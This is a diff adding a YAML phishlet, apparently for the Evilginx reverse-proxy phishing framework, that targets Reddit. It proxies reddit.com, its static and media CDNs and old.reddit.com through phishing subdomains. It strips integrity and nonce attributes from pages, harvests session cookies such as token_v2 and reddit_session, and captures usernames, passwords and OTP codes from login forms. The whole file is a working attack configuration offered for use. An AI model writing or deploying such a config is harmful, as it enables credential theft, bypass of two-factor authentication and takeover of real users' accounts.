@@ -1,0 +1,57 @@
+min_ver: '3.0.0'
+author: '0fukuAkz'
+
+proxy_hosts:
+  - {phish_sub: 'reddit', orig_sub: 'www', domain: 'reddit.com', session: true, is_landing: true, auto_filter: true}
+  # Static assets CDN — JS bundles, icons
+  - {phish_sub: 'redditstatic', orig_sub: 'www', domain: 'redditstatic.com', session: false, is_landing: false, auto_filter: true}
+  # Media CDN — thumbnails on the login page
+  - {phish_sub: 'redditmedia', orig_sub: 'www', domain: 'redditmedia.com', session: false, is_landing: false, auto_filter: false}
+  # Old Reddit — also accepts login; some users land here via direct link
+  - {phish_sub: 'old', orig_sub: 'old', domain: 'reddit.com', session: true, is_landing: false, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: 'www.reddit.com', orig_sub: 'www', domain: 'reddit.com', search: ' integrity="[^"]*"', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'www.reddit.com', orig_sub: 'www', domain: 'reddit.com', search: ' integrity=''[^'']*''', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'www.reddit.com', orig_sub: 'www', domain: 'reddit.com', search: ' nonce="[^"]*"', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'www.reddit.com', orig_sub: 'www', domain: 'reddit.com', search: ' nonce=''[^'']*''', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'www.reddit.com', orig_sub: 'www', domain: 'reddit.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.reddit.com', orig_sub: 'www', domain: 'redditstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  # Old Reddit sub_filters
+  - {triggers_on: 'old.reddit.com', orig_sub: 'old', domain: 'reddit.com', search: ' integrity="[^"]*"', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'old.reddit.com', orig_sub: 'old', domain: 'reddit.com', search: ' nonce="[^"]*"', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'old.reddit.com', orig_sub: 'old', domain: 'reddit.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'old.reddit.com', orig_sub: 'www', domain: 'redditstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+auth_tokens:
+  - domain: '.reddit.com'
+    keys: ['token_v2', 'reddit_session,opt', 'loid,opt', 'edgebucket,opt', 'rp_session,opt', 'G_AUTHUSER_H,opt', 'recent_srs,opt', 'csv,opt', 'pac,opt']
+    type: 'cookie'
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+  custom:
+    # Old Reddit form field names
+    - {key: 'user', search: '(.*)', type: 'post'}
+    - {key: 'passwd', search: '(.*)', type: 'post'}
+    # OTP / 2FA
+    - {key: 'otp', search: '(.*)', type: 'post'}
+
+auth_urls:
+  - '/login'
+  - '/api/login'
+  - '/r/.*'
+  - '/'
+
+login:
+  domain: 'www.reddit.com'
+  path: '/login/'
